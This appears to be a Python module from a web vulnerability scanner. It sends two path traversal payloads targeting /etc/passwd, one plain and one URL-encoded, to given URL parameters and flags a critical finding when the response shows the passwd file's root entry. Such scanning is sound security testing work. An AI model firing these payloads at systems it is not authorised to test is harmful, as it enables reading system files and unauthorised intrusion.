from utils.http import session, TIMEOUT

payloads = [
"../../../../etc/passwd",
"..%2f..%2f..%2fetc/passwd"
]


def scan_path_traversal(params):

    findings = []

    for item in params:

        url = item["url"]
        param = item["param"]

        for payload in payloads:

            test = f"{url}?{param}={payload}"

            try:

                r = session.get(test, timeout=TIMEOUT)

                if "root:x:0:0" in r.text:

                    findings.append({
                        "type": "Path Traversal",
                        "severity": "critical",
                        "url": test
                    })

            except:
                pass

    return findings
